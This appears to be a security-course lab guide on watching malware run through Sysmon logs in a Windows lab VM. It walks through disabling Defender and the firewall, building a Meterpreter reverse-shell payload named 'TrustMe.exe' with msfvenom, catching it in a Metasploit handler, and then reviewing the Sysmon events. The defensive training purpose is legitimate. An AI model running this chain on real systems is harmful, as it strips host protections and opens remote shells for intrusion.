![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

---

This is a lab from **John Strand**'s **Information Security Core Skills** Course:

https://www.antisyphontraining.com/product/information-security-core-skills-tm/

---

# Sysmon

# Windows VM
In this lab we will be looking at what an attacker can do with valid accounts.  

To learn more about this attack check out the following:

https://attack.mitre.org/techniques/T1078/

Here are just some groups that have used this attack:

<img width="1082" height="691" alt="image" src="https://github.com/user-attachments/assets/634d0a14-def0-42da-9f23-0b26bb3faa07" />


Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/bb7c958d-9879-44d3-a6e2-441139a94caa" />

Next, run the following command in the **Powershell** terminal:

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

![](attachments/applocker_disabledefender.png)

This will disable **Defender** for this session.

If you get angry red errors, that is **Ok**, it means **Defender** is not running.

Next, lets ensure the firewall is disabled. In a Windows Command Prompt.

```ps
netsh advfirewall set allprofiles state off
```


Next, set a password for the Administrator account that you can remember

```ps
net user Administrator password1234
```

Please note, that is a very bad password.  Come up with something better. But, please remember it.


Now we need a **Linux Terminal**


- **Double-click** `Ubuntu Shell` on Desktop

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />



Become root:

```bash
sudo su -
```


Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:

```bash
ifconfig
```

<img width="716" height="175" alt="Get_IPLinux" src="https://github.com/user-attachments/assets/55ffa0a2-0502-4331-ad4e-720b1c1f4205" />

**REMEMBER: YOUR IP WILL BE DIFFERENT**

Run the following commands to start a simple backdoor and backdoor listener: 

```bash
cd /tmp/
```

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
```

Let's start the **Metasploit** Handler. We need another **Linux Terminal**

- **Double-click** `Ubuntu Shell` on Desktop

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />


Now let's start the **Metasploit** Handler

```bash
sudo msfconsole -q
```

We are going to run the following commands to correctly set the parameters:

```bash
use exploit/multi/handler
```

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

```bash
set LHOST [Your Linux IP Address]
```

Remember, **Your IP will be different!**

```bash
exploit
```

It should look like this:

<img width="687" height="206" alt="2026-02-23_15-38" src="https://github.com/user-attachments/assets/71226123-2163-4237-8173-c7586de81ee7" />

Going back to our **Powershell** terminal, copy the file over from **Linux**

```ps
cd .\Desktop\
```

```ps
scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
```


Now we will need to open a **"cmd.exe"** terminal as **Administrator**.

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/e8526cf1-0ed9-48f6-bd3f-f56af7536463" />


```cmd
cd \IntroLabs
```

```cmd
Sysmon64.exe -accepteula -i sysmonconfig-export.xml
```

It should look like this:

<img width="598" height="354" alt="2026-03-13_16-37" src="https://github.com/user-attachments/assets/d8175d3c-e72a-4d57-bdd6-65409afb838a" />


Let's run the following commands to run the **"TrustMe.exe"** file.

```cmd
cd \Users\Administrator\Desktop
```
 
Then run it with the following:

```cmd
TrustMe.exe
```

Back at your **Linux terminal**, you should have a metasploit session!

<img width="920" height="136" alt="2026-03-13_16-38" src="https://github.com/user-attachments/assets/35c77cf6-ec9a-4379-a359-c1984f221b72" />

Now, we need to view the Sysmon events for this malware:

Open **"Event Viewer"** by pressing the Windows key and searching for it.

![](attachments/eventviewer.png)

You will select Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational

![](attachments/eventviewernav1.png)

You'll have to scroll down a bit until you find the **Sysmon** folder.  

![](attachments/eventviwernav2.png)

Start at the top and work down through the logs, you should see your **malware** executing.  Please note your paths may be different.


<img width="1325" height="938" alt="2026-03-13_16-45" src="https://github.com/user-attachments/assets/e1038335-5dce-4384-a98d-5683adda1608" />





***                                                                 
<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/WebTestingIntroClass/WebTesting.md)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/RITAIntroClass/RITA.md)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---



